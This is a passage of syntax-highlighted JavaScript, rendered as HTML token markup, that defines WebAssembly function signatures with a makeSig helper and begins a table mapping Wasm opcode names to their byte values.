      <span class="token keyword">let</span> kSig_i_r <span class="token operator">=</span> <span class="token function">makeSig</span><span class="token punctuation">(</span><span class="token punctuation">[</span>kWasmExternRef<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span>kWasmI32<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kSig_v_r <span class="token operator">=</span> <span class="token function">makeSig</span><span class="token punctuation">(</span><span class="token punctuation">[</span>kWasmExternRef<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kSig_v_a <span class="token operator">=</span> <span class="token function">makeSig</span><span class="token punctuation">(</span><span class="token punctuation">[</span>kWasmAnyFunc<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kSig_v_rr <span class="token operator">=</span> <span class="token function">makeSig</span><span class="token punctuation">(</span><span class="token punctuation">[</span>kWasmExternRef<span class="token punctuation">,</span> kWasmExternRef<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kSig_v_aa <span class="token operator">=</span> <span class="token function">makeSig</span><span class="token punctuation">(</span><span class="token punctuation">[</span>kWasmAnyFunc<span class="token punctuation">,</span> kWasmAnyFunc<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kSig_r_v <span class="token operator">=</span> <span class="token function">makeSig</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span>kWasmExternRef<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kSig_a_v <span class="token operator">=</span> <span class="token function">makeSig</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span>kWasmAnyFunc<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kSig_a_i <span class="token operator">=</span> <span class="token function">makeSig</span><span class="token punctuation">(</span><span class="token punctuation">[</span>kWasmI32<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span>kWasmAnyFunc<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kSig_s_i <span class="token operator">=</span> <span class="token function">makeSig</span><span class="token punctuation">(</span><span class="token punctuation">[</span>kWasmI32<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span>kWasmS128<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kSig_i_s <span class="token operator">=</span> <span class="token function">makeSig</span><span class="token punctuation">(</span><span class="token punctuation">[</span>kWasmS128<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span>kWasmI32<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token keyword">function</span> <span class="token function">makeSig</span><span class="token punctuation">(</span><span class="token parameter">params<span class="token punctuation">,</span> results</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">return</span> <span class="token punctuation">&#123;</span> <span class="token literal-property property">params</span><span class="token operator">:</span> params<span class="token punctuation">,</span> <span class="token literal-property property">results</span><span class="token operator">:</span> results <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
      <span class="token punctuation">&#125;</span>
      <span class="token keyword">function</span> <span class="token function">makeSig_v_x</span><span class="token punctuation">(</span><span class="token parameter">x</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">return</span> <span class="token function">makeSig</span><span class="token punctuation">(</span><span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token punctuation">&#125;</span>
      <span class="token keyword">function</span> <span class="token function">makeSig_x_v</span><span class="token punctuation">(</span><span class="token parameter">x</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">return</span> <span class="token function">makeSig</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token punctuation">&#125;</span>
      <span class="token keyword">function</span> <span class="token function">makeSig_v_xx</span><span class="token punctuation">(</span><span class="token parameter">x</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">return</span> <span class="token function">makeSig</span><span class="token punctuation">(</span><span class="token punctuation">[</span>x<span class="token punctuation">,</span> x<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token punctuation">&#125;</span>
      <span class="token keyword">function</span> <span class="token function">makeSig_r_v</span><span class="token punctuation">(</span><span class="token parameter">r</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">return</span> <span class="token function">makeSig</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span>r<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token punctuation">&#125;</span>
      <span class="token keyword">function</span> <span class="token function">makeSig_r_x</span><span class="token punctuation">(</span><span class="token parameter">r<span class="token punctuation">,</span> x</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">return</span> <span class="token function">makeSig</span><span class="token punctuation">(</span><span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span>r<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token punctuation">&#125;</span>
      <span class="token keyword">function</span> <span class="token function">makeSig_r_xx</span><span class="token punctuation">(</span><span class="token parameter">r<span class="token punctuation">,</span> x</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">return</span> <span class="token function">makeSig</span><span class="token punctuation">(</span><span class="token punctuation">[</span>x<span class="token punctuation">,</span> x<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span>r<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token punctuation">&#125;</span>
      <span class="token comment">// Opcodes</span>
      <span class="token keyword">const</span> kWasmOpcodes <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
        <span class="token literal-property property">Unreachable</span><span class="token operator">:</span> <span class="token number">0x00</span><span class="token punctuation">,</span>
        <span class="token literal-property property">Nop</span><span class="token operator">:</span> <span class="token number">0x01</span><span class="token punctuation">,</span>
        <span class="token literal-property property">Block</span><span class="token operator">:</span> <span class="token number">0x02</span><span class="token punctuation">,</span>
        <span class="token literal-property property">Loop</span><span class="token operator">:</span> <span class="token number">0x03</span><span class="token punctuation">,</span>
        <span class="token literal-property property">If</span><span class="token operator">:</span> <span class="token number">0x04</span><span class="token punctuation">,</span>
        <span class="token literal-property property">Else</span><span class="token operator">:</span> <span class="token number">0x05</span><span class="token punctuation">,</span>
        <span class="token literal-property property">Try</span><span class="token operator">:</span> <span class="token number">0x06</span><span class="token punctuation">,</span>
        <span class="token literal-property property">TryTable</span><span class="token operator">:</span> <span class="token number">0x1f</span><span class="token punctuation">,</span>
        <span class="token literal-property property">ThrowRef</span><span class="token operator">:</span> <span class="token number">0x0a</span><span class="token punctuation">,</span>
        <span class="token literal-property property">Catch</span><span class="token operator">:</span> <span class="token number">0x07</span><span class="token punctuation">,</span>
        <span class="token literal-property property">Throw</span><span class="token operator">:</span> <span class="token number">0x08</span><span class="token punctuation">,</span>
        <span class="token literal-property property">Rethrow</span><span class="token operator">:</span> <span class="token number">0x09</span><span class="token punctuation">,</span>
        <span class="token literal-property property">CatchAll</span><span class="token operator">:</span> <span class="token number">0x19</span><span class="token punctuation">,</span>
        <span class="token literal-property property">End</span><span class="token operator">:</span> <span class="token number">0x0b</span><span class="token punctuation">,</span>
        <span class="token literal-property property">Br</span><span class="token operator">:</span> <span class="token number">0x0c</span><span class="token punctuation">,</span>
        <span class="token literal-property property">BrIf</span><span class="token operator">:</span> <span class="token number">0x0d</span><span class="token punctuation">,</span>
        <span class="token literal-property property">BrTable</span><span class="token operator">:</span> <span class="token number">0x0e</span><span class="token punctuation">,</span>
        <span class="token literal-property property">Return</span><span class="token operator">:</span> <span class="token number">0x0f</span><span class="token punctuation">,</span>
        <span class="token literal-property property">CallFunction</span><span class="token operator">:</span> <span class="token number">0x10</span><span class="token punctuation">,</span>
        <span class="token literal-property property">CallIndirect</span><span class="token operator">:</span> <span class="token number">0x11</span><span class="token punctuation">,</span>
        <span class="token literal-property property">ReturnCall</span><span class="token operator">:</span> <span class="token number">0x12</span><span class="token punctuation">,</span>
        <span class="token literal-property property">ReturnCallIndirect</span><span class="token operator">:</span> <span class="token number">0x13</span><span class="token punctuation">,</span>
        <span class="token literal-property property">CallRef</span><span class="token operator">:</span> <span class="token number">0x14</span><span class="token punctuation">,</span>
        <span class="token literal-property property">ReturnCallRef</span><span class="token operator">:</span> <span class="token number">0x15</span><span class="token punctuation">,</span>
        <span class="token literal-property property">NopForTestingUnsupportedInLiftoff</span><span class="token operator">:</span> <span class="token number">0x16</span><span class="token punctuation">,</span>
        <span class="token literal-property property">Delegate</span><span class="token operator">:</span> <span class="token number">0x18</span><span class="token punctuation">,</span>
        <span class="token literal-property property">Drop</span><span class="token operator">:</span> <span class="token number">0x1a</span><span class="token punctuation">,</span>
        <span class="token literal-property property">Select</span><span class="token operator">:</span> <span class="token number">0x1b</span><span class="token punctuation">,</span>
        <span class="token literal-property property">SelectWithType</span><span class="token operator">:</span> <span class="token number">0x1c</span><span class="token punctuation">,</span>
        <span class="token literal-property property">LocalGet</span><span class="token operator">:</span> <span class="token number">0x20</span><span class="token punctuation">,</span>
        <span class="token literal-property property">LocalSet</span><span class="token operator">:</span> <span class="token number">0x21</span><span class="token punctuation">,</span>
        <span class="token literal-property property">LocalTee</span><span class="token operator">:</span> <span class="token number">0x22</span><span class="token punctuation">,</span>
        <span class="token literal-property property">GlobalGet</span><span class="token operator">:</span> <span class="token number">0x23</span><span class="token punctuation">,</span>
        <span class="token literal-property property">GlobalSet</span><span class="token operator">:</span> <span class="token number">0x24</span><span class="token punctuation">,</span>
        <span class="token literal-property property">TableGet</span><span class="token operator">:</span> <span class="token number">0x25</span><span class="token punctuation">,</span>
        <span class="token literal-property property">TableSet</span><span class="token operator">:</span> <span class="token number">0x26</span><span class="token punctuation">,</span>
        <span class="token literal-property property">I32LoadMem</span><span class="token operator">:</span> <span class="token number">0x28</span><span class="token punctuation">,</span>
        <span class="token literal-property property">I64LoadMem</span><span class="token operator">:</span> <span class="token number">0x29</span><span class="token punctuation">,</span>
        <span class="token literal-property property">F32LoadMem</span><span class="token operator">:</span> <span class="token number">0x2a</span><span class="token punctuation">,</span>
        <span class="token literal-property property">F64LoadMem</span><span class="token operator">:</span> <span class="token number">0x2b</span><span class="token punctuation">,</span>
        <span class="token literal-property property">I32LoadMem8S</span><span class="token operator">:</span> <span class="token number">0x2c</span><span class="token punctuation">,</span>
        <span class="token literal-property property">I32LoadMem8U</span><span class="token operator">:</span> <span class="token number">0x2d</span><span class="token punctuation">,</span>
        <span class="token literal-property property">I32LoadMem16S</span><span class="token operator">:</span> <span class="token number">0x2e</span><span class="token punctuation">,</span>
        <span class="token literal-property property">I32LoadMem16U</span><span class="token operator">:</span> <span class="token number">0x2f</span><span class="token punctuation">,</span>
        <span class="token literal-property property">I64LoadMem8S</span><span class="token operator">:</span> <span class="token number">0x30</span><span class="token punctuation">,</span>
        <span class="token literal-property property">I64LoadMem8U</span><span class="token operator">:</span> <span class="token number">0x31</span><span class="token punctuation">,</span>
        <span class="token literal-property property">I64LoadMem16S</span><span class="token operator">:</span> <span class="token number">0x32</span><span class="token punctuation">,</span>
        <span class="token literal-property property">I64LoadMem16U</span><span class="token operator">:</span> <span class="token number">0x33</span><span class="token punctuation">,</span>
        <span class="token literal-property property">I64LoadMem32S</span><span class="token operator">:</span> <span class="token number">0x34</span><span class="token punctuation">,</span>
        <span class="token literal-property property">I64LoadMem32U</span><span class="token operator">:</span> <span class="token number">0x35</span><span class="token punctuation">,</span>
        <span class="token literal-property property">I32StoreMem</span><span class="token operator">:</span> <span class="token number">0x36</span><span class="token punctuation">,</span>
        <span class="token literal-property property">I64StoreMem</span><span class="token operator">:</span> <span class="token number">0x37</span><span class="token punctuation">,</span>
        <span class="token literal-property property">F32StoreMem</span><span class="token operator">:</span> <span class="token number">0x38</span><span class="token punctuation">,</span>
        <span class="token literal-property property">F64StoreMem</span><span class="token operator">:</span> <span class="token number">0x39</span><span class="token punctuation">,</span>
        <span class="token literal-property property">I32StoreMem8</span><span class="token operator">:</span> <span class="token number">0x3a</span><span class="token punctuation">,</span>
        <span class="token literal-property property">I32StoreMem16</span><span class="token operator">:</span> <span class="token number">0x3b</span><span class="token punctuation">,</span>
        <span class="token literal-property property">I64StoreMem8</span><span class="token operator">:</span> <span class="token number">0x3c</span><span class="token punctuation">,</span>
        <span class="token literal-property property">I64StoreMem16</span><span class="token operator">:</span> <span class="token number">0x3d</span><span class="token punctuation">,</span>
        <span class="token literal-property property">I64StoreMem32</span><span class="token operator">:</span> <span class="token number">0x3e</span><span class="token punctuation">,</span>
        <span class="token literal-property property">MemorySize</span><span class="token operator">:</span> <span class="token number">0x3f</span><span class="token punctuation">,</span>
        <span class="token literal-property property">MemoryGrow</span><span class="token operator">:</span> <span class="token number">0x40</span><span class="token punctuation">,</span>
        <span class="token literal-property property">I32Const</span><span class="token operator">:</span> <span class="token number">0x41</span><span class="token punctuation">,</span>
        <span class="token literal-property property">I64Const</span><span class="token operator">:</span> <span class="token number">0x42</span><span class="token punctuation">,</span>
        <span class="token literal-property property">F32Const</span><span class="token operator">:</span> <span class="token number">0x43</span><span class="token punctuation">,</span>
        <span class="token literal-property property">F64Const</span><span class="token operator">:</span> <span class="token number">0x44</span><span class="token punctuation">,</span>
        <span class="token literal-property property">I32Eqz</span><span class="token operator">:</span> <span class="token number">0x45</span><span class="token punctuation">,</span>
        <span class="token literal-property property">I32Eq</span><span class="token operator">:</span> <span class="token number">0x46</span><span class="token punctuation">,</span>
        <span class="token literal-property property">I32Ne</span><span class="token operator">:</span> <span class="token number">0x47</span><span class="token punctuation">,</span>
        <span class="token literal-property property">I32LtS</span><span class="token operator">:</span> <span class="token number">0x48</span><span class="token punctuation">,</span>
        <span class="token literal-property property">I32LtU</span><span class="token operator">:</span> <span class="token number">0x49</span><span class="token punctuation">,</span>
        <span class="token literal-property property">I32GtS</span><span class="token operator">:</span> <span class="token number">0x4a</span><span class="token punctuation">,</span>
        <span class="token literal-property property">I32GtU</span><span class="token operator">:</span> <span class="token number">0x4b</span><span class="token punctuation">,</span>
        <span class="token literal-property property">I32LeS</span><span class="token operator">:</span> <span class="token number">0x4c</span><span class="token punctuation">,</span>
        <span class="token literal-property property">I32LeU</span><span class="token operator">:</span> <span class="token number">0x4d</span><span class="token punctuation">,</span>
        <span class="token literal-property property">I32GeS</span><span class="token operator">:</span> <span class="token number">0x4e</span><span class="token punctuation">,</span>
        <span class="token literal-property property">I32GeU</span><span class="token operator">:</span> <span class="token number">0x4f</span><span class="token punctuation">,</span>
        <span class="token literal-property property">I64Eqz</span><span class="token operator">:</span> <span class="token number">0x50</span><span class="token punctuation">,</span>
        <span class="token literal-property property">I64Eq</span><span class="token operator">:</span> <span class="token number">0x51</span><span class="token punctuation">,</span>
        <span class="token literal-property property">I64Ne</span><span class="token operator">:</span> <span class="token number">0x52</span><span class="token punctuation">,</span>
        <span class="token literal-property property">I64LtS</span><span class="token operator">:</span> <span class="token number">0x53</span><span class="token punctuation">,</span>
        <span class="token literal-property property">I64LtU</span><span class="token operator">:</span> <span class="token number">0x54</span><span class="token punctuation">,</span>
        <span class="token literal-property property">I64GtS</span><span class="token operator">:</span> <span class="token number">0x55</span><span class="token punctuation">,</span>
        <span class="token literal-property property">I64GtU</span><span class="token operator">:</span> <span class="token number">0x56</span><span class="token punctuation">,</span>
        <span class="token literal-property property">I64LeS</span><span class="token operator">:</span> <span class="token number">0x57</span><span class="token punctuation">,</span>
        <span class="token literal-property property">I64LeU</span><span class="token operator">:</span> <span class="token number">0x58</span><span class="token punctuation">,</span>
        <span class="token literal-property property">I64GeS</span><span class="token operator">:</span> <span class="token number">0x59</span><span class="token punctuation">,</span>
        <span class="token literal-property property">I64GeU</span><span class="token operator">:</span> <span class="token number">0x5a</span><span class="token punctuation">,</span>
        <span class="token literal-property property">F32Eq</span><span class="token operator">:</span> <span class="token number">0x5b</span><span class="token punctuation">,</span>
        <span class="token literal-property property">F32Ne</span><span class="token operator">:</span> <span class="token number">0x5c</span><span class="token punctuation">,</span>
        <span class="token literal-property property">F32Lt</span><span class="token operator">:</span> <span class="token number">0x5d</span><span class="token punctuation">,</span>
        <span class="token literal-property property">F32Gt</span><span class="token operator">:</span> <span class="token number">0x5e</span><span class="token punctuation">,</span>
        <span class="token literal-property property">F32Le</span><span class="token operator">:</span> <span class="token number">0x5f</span><span class="token punctuation">,</span>
        <span class="token literal-property property">F32Ge</span><span class="token operator">:</span> <span class="token number">0x60</span><span class="token punctuation">,</span>
        <span class="token literal-property property">F64Eq</span><span class="token operator">:</span> <span class="token number">0x61</span><span class="token punctuation">,</span>
        <span class="token literal-property property">F64Ne</span><span class="token operator">:</span> <span class="token number">0x62</span><span class="token punctuation">,</span>
        <span class="token literal-property property">F64Lt</span><span class="token operator">:</span> <span class="token number">0x63</span><span class="token punctuation">,</span>
        <span class="token literal-property property">F64Gt</span><span class="token operator">:</span> <span class="token number">0x64</span><span class="token punctuation">,</span>
        <span class="token literal-property property">F64Le</span><span class="token operator">:</span> <span class="token number">0x65</span><span class="token punctuation">,</span>
        <span class="token literal-property property">F64Ge</span><span class="token operator">:</span> <span class="token number">0x66</span><span class="token punctuation">,</span>
        <span class="token literal-property property">I32Clz</span><span class="token operator">:</span> <span class="token number">0x67</span><span class="token punctuation">,</span>
        <span class="token literal-property property">I32Ctz</span><span class="token operator">:</span> <span class="token number">0x68</span><span class="token punctuation">,</span>
        <span class="token literal-property property">I32Popcnt</span><span class="token operator">:</span> <span class="token number">0x69</span><span class="token punctuation">,</span>
        <span class="token literal-property property">I32Add</span><span class="token operator">:</span> <span class="token number">0x6a</span><span class="token punctuation">,</span>
        <span class="token literal-property property">I32Sub</span><span class="token operator">:</span> <span class="token number">0x6b</span><span class="token punctuation">,</span>
        <span class="token literal-property property">I32Mul</span><span class="token operator">:</span> <span class="token number">0x6c</span><span class="token punctuation">,</span>
        <span class="token literal-property property">I32DivS</span><span class="token operator">:</span> <span class="token number">0x6d</span><span class="token punctuation">,</span>
        <span class="token literal-property property">I32DivU</span><span class="token operator">:</span> <span class="token number">0x6e</span><span class="token punctuation">,</span>
        <span class="token literal-property property">I32RemS</span><span class="token operator">:</span> <span class="token number">0x6f</span><span class="token punctuation">,</span>
        <span class="token literal-property property">I32RemU</span><span class="token operator">:</span> <span class="token number">0x70</span><span class="token punctuation">,</span>
        <span class="token literal-property property">I32And</span><span class="token operator">:</span> <span class="token number">0x71</span><span class="token punctuation">,</span>
        <span class="token literal-property property">I32Ior</span><span class="token operator">:</span> <span class="token number">0x72</span><span class="token punctuation">,</span>
        <span class="token literal-property property">I32Xor</span><span class="token operator">:</span> <span class="token number">0x73</span><span class="token punctuation">,</span>
        <span class="token literal-property property">I32Shl</span><span class="token operator">:</span> <span class="token number">0x74</span><span class="token punctuation">,</span>
        <span class="token literal-property property">I32ShrS</span><span class="token operator">:</span> <span class="token number">0x75</span><span class="token punctuation">,</span>
        <span class="token literal-property property">I32ShrU</span><span class="token operator">:</span> <span class="token number">0x76</span><span class="token punctuation">,</span>
        <span class="token literal-property property">I32Rol</span><span class="token operator">:</span> <span class="token number">0x77</span><span class="token punctuation">,</span>
        <span class="token literal-property property">I32Ror</span><span class="token operator">:</span> <span class="token number">0x78</span><span class="token punctuation">,</span>
        <span class="token literal-property property">I64Clz</span><span class="token operator">:</span> <span class="token number">0x79</span><span class="token punctuation">,</span>
        <span class="token literal-property property">I64Ctz</span><span class="token operator">:</span> <span class="token number">0x7a</span><span class="token punctuation">,</span>
        <span class="token literal-property property">I64Popcnt</span><span class="token operator">:</span> <span class="token number">0x7b</span><span class="token punctuation">,</span>
        <span class="token literal-property property">I64Add</span><span class="token operator">:</span> <span class="token number">0x7c</span><span class="token punctuation">,</span>
        <span class="token literal-property property">I64Sub</span><span class="token operator">:</span> <span class="token number">0x7d</span><span class="token punctuation">,</span>
        <span class="token literal-property property">I64Mul</span><span class="token operator">:</span> <span class="token number">0x7e</span><span class="token punctuation">,</span>
        <span class="token literal-property property">I64DivS</span><span class="token operator">:</span> <span class="token number">0x7f</span><span class="token punctuation">,</span>
        <span class="token literal-property property">I64DivU</span><span class="token operator">:</span> <span class="token number">0x80</span><span class="token punctuation">,</span>
        <span class="token literal-property property">I64RemS</span><span class="token operator">:</span> <span class="token number">0x81</span><span class="token punctuation">,</span>
        <span class="token literal-property property">I64RemU</span><span class="token operator">:</span> <span class="token number">0x82</span><span class="token punctuation">,</span>
        <span class="token literal-property property">I64And</span><span class="token operator">:</span> <span class="token number">0x83</span><span class="token punctuation">,</span>
        <span class="token literal-property property">I64Ior</span><span class="token operator">:</span> <span class="token number">0x84</span><span class="token punctuation">,</span>
        <span class="token literal-property property">I64Xor</span><span class="token operator">:</span> <span class="token number">0x85</span><span class="token punctuation">,</span>
        <span class="token literal-property property">I64Shl</span><span class="token operator">:</span> <span class="token number">0x86</span><span class="token punctuation">,</span>
        <span class="token literal-property property">I64ShrS</span><span class="token operator">:</span> <span class="token number">0x87</span><span class="token punctuation">,</span>
        <span class="token literal-property property">I64ShrU</span><span class="token operator">:</span> <span class="token number">0x88</span><span class="token punctuation">,</span>
        <span class="token literal-property property">I64Rol</span><span class="token operator">:</span> <span class="token number">0x89</span><span class="token punctuation">,</span>
        <span class="token literal-property property">I64Ror</span><span class="token operator">:</span> <span class="token number">0x8a</span><span class="token punctuation">,</span>
        <span class="token literal-property property">F32Abs</span><span class="token operator">:</span> <span class="token number">0x8b</span><span class="token punctuation">,</span>
        <span class="token literal-property property">F32Neg</span><span class="token operator">:</span> <span class="token number">0x8c</span><span class="token punctuation">,</span>
        <span class="token literal-property property">F32Ceil</span><span class="token operator">:</span> <span class="token number">0x8d</span><span class="token punctuation">,</span>
        <span class="token literal-property property">F32Floor</span><span class="token operator">:</span> <span class="token number">0x8e</span><span class="token punctuation">,</span>
        <span class="token literal-property property">F32Trunc</span><span class="token operator">:</span> <span class="token number">0x8f</span><span class="token punctuation">,</span>
        <span class="token literal-property property">F32NearestInt</span><span class="token operator">:</span> <span class="token number">0x90</span><span class="token punctuation">,</span>
        <span class="token literal-property property">F32Sqrt</span><span class="token operator">:</span> <span class="token number">0x91</span><span class="token punctuation">,</span>
        <span class="token literal-property property">F32Add</span><span class="token operator">:</span> <span class="token number">0x92</span><span class="token punctuation">,</span>
        <span class="token literal-property property">F32Sub</span><span class="token operator">:</span> <span class="token number">0x93</span><span class="token punctuation">,</span>
        <span class="token literal-property property">F32Mul</span><span class="token operator">:</span> <span class="token number">0x94</span><span class="token punctuation">,</span>
        <span class="token literal-property property">F32Div</span><span class="token operator">:</span> <span class="token number">0x95</span><span class="token punctuation">,</span>
        <span class="token literal-property property">F32Min</span><span class="token operator">:</span> <span class="token number">0x96</span><span class="token punctuation">,</span>
        <span class="token literal-property property">F32Max</span><span class="token operator">:</span> <span class="token number">0x97</span><span class="token punctuation">,</span>
        <span class="token literal-property property">F32CopySign</span><span class="token operator">:</span> <span class="token number">0x98</span><span class="token punctuation">,</span>
        <span class="token literal-property property">F64Abs</span><span class="token operator">:</span> <span class="token number">0x99</span><span class="token punctuation">,</span>
        <span class="token literal-property property">F64Neg</span><span class="token operator">:</span> <span class="token number">0x9a</span><span class="token punctuation">,</span>
        <span class="token literal-property property">F64Ceil</span><span class="token operator">:</span> <span class="token number">0x9b</span><span class="token punctuation">,</span>
        <span class="token literal-property property">F64Floor</span><span class="token operator">:</span> <span class="token number">0x9c</span><span class="token punctuation">,</span>
        <span class="token literal-property property">F64Trunc</span><span class="token operator">:</span> <span class="token number">0x9d</span><span class="token punctuation">,</span>
        <span class="token literal-property property">F64NearestInt</span><span class="token operator">:</span> <span class="token number">0x9e</span><span class="token punctuation">,</span>
        <span class="token literal-property property">F64Sqrt</span><span class="token operator">:</span> <span class="token number">0x9f</span><span class="token punctuation">,</span>
        <span class="token literal-property property">F64Add</span><span class="token operator">:</span> <span class="token number">0xa0</span><span class="token punctuation">,</span>
        <span class="token literal-property property">F64Sub</span><span class="token operator">:</span> <span class="token number">0xa1</span><span class="token punctuation">,</span>
        <span class="token literal-property property">F64Mul</span><span class="token operator">:</span> <span class="token number">0xa2</span><span class="token punctuation">,</span>
        <span class="token literal-property property">F64Div</span><span class="token operator">:</span> <span class="token number">0xa3</span><span class="token punctuation">,</span>
        <span class="token literal-property property">F64Min</span><span class="token operator">:</span> <span class="token number">0xa4</span><span class="token punctuation">,</span>
        <span class="token literal-property property">F64Max</span><span class="token operator">:</span> <span class="token number">0xa5</span><span class="token punctuation">,</span>
        <span class="token literal-property property">F64CopySign</span><span class="token operator">:</span> <span class="token number">0xa6</span><span class="token punctuation">,</span>
        <span class="token literal-property property">I32ConvertI64</span><span class="token operator">:</span> <span class="token number">0xa7</span><span class="token punctuation">,</span>
        <span class="token literal-property property">I32SConvertF32</span><span class="token operator">:</span> <span class="token number">0xa8</span><span class="token punctuation">,</span>
        <span class="token literal-property property">I32UConvertF32</span><span class="token operator">:</span> <span class="token number">0xa9</span><span class="token punctuation">,</span>
        <span class="token literal-property property">I32SConvertF64</span><span class="token operator">:</span> <span class="token number">0xaa</span><span class="token punctuation">,</span>
        <span class="token literal-property property">I32UConvertF64</span><span class="token operator">:</span> <span class="token number">0xab</span><span class="token punctuation">,</span>
        <span class="token literal-property property">I64SConvertI32</span><span class="token operator">:</span> <span class="token number">0xac</span><span class="token punctuation">,</span>
        <span class="token literal-property property">I64UConvertI32</span><span class="token operator">:</span> <span class="token number">0xad</span><span class="token punctuation">,</span>
        <span class="token literal-property property">I64SConvertF32</span><span class="token operator">:</span> <span class="token number">0xae</span><span class="token punctuation">,</span>
        <span class="token literal-property property">I64UConvertF32</span><span class="token operator">:</span> <span class="token number">0xaf</span><span class="token punctuation">,</span>
        <span class="token literal-property property">I64SConvertF64</span><span class="token operator">:</span> <span class="token number">0xb0</span><span class="token punctuation">,</span>
        <span class="token literal-property property">I64UConvertF64</span><span class="token operator">:</span> <span class="token number">0xb1</span><span class="token punctuation">,</span>
        <span class="token literal-property property">F32SConvertI32</span><span class="token operator">:</span> <span class="token number">0xb2</span><span class="token punctuation">,</span>
        <span class="token literal-property property">F32UConvertI32</span><span class="token operator">:</span> <span class="token number">0xb3</span><span class="token punctuation">,</span>
        <span class="token literal-property property">F32SConvertI64</span><span class="token operator">:</span> <span class="token number">0xb4</span><span class="token punctuation">,</span>
        <span class="token literal-property property">F32UConvertI64</span><span class="token operator">:</span> <span class="token number">0xb5</span><span class="token punctuation">,</span>
        <span class="token literal-property property">F32ConvertF64</span><span class="token operator">:</span> <span class="token number">0xb6</span><span class="token punctuation">,</span>
        <span class="token literal-property property">F64SConvertI32</span><span class="token operator">:</span> <span class="token number">0xb7</span><span class="token punctuation">,</span>
        <span class="token literal-property property">F64UConvertI32</span><span class="token operator">:</span> <span class="token number">0xb8</span><span class="token punctuation">,</span>
        <span class="token literal-property property">F64SConvertI64</span><span class="token operator">:</span> <span class="token number">0xb9</span><span class="token punctuation">,</span>
        <span class="token literal-property property">F64UConvertI64</span><span class="token operator">:</span> <span class="token number">0xba</span><span class="token punctuation">,</span>
        <span class="token literal-property property">F64ConvertF32</span><span class="token operator">:</span> <span class="token number">0xbb</span><span class="token punctuation">,</span>
        <span class="token literal-property property">I32ReinterpretF32</span><span class="token operator">:</span> <span class="token number">0xbc</span><span class="token punctuation">,</span>
        <span class="token literal-property property">I64ReinterpretF64</span><span class="token operator">:</span> <span class="token number">0xbd</span><span class="token punctuation">,</span>
        <span class="token literal-property property">F32ReinterpretI32</span><span class="token operator">:</span> <span class="token number">0xbe</span><span class="token punctuation">,</span>
        <span class="token literal-property property">F64ReinterpretI64</span><span class="token operator">:</span> <span class="token number">0xbf</span><span class="token punctuation">,</span>
        <span class="token literal-property property">I32SExtendI8</span><span class="token operator">:</span> <span class="token number">0xc0</span><span class="token punctuation">,</span>
        <span class="token literal-property property">I32SExtendI16</span><span class="token operator">:</span> <span class="token number">0xc1</span><span class="token punctuation">,</span>
        <span class="token literal-property property">I64SExtendI8</span><span class="token operator">:</span> <span class="token number">0xc2</span><span class="token punctuation">,</span>
        <span class="token literal-property property">I64SExtendI16</span><span class="token operator">:</span> <span class="token number">0xc3</span><span class="token punctuation">,</span>
        <span class="token literal-property property">I64SExtendI32</span><span class="token operator">:</span> <span class="token number">0xc4</span><span class="token punctuation">,</span>
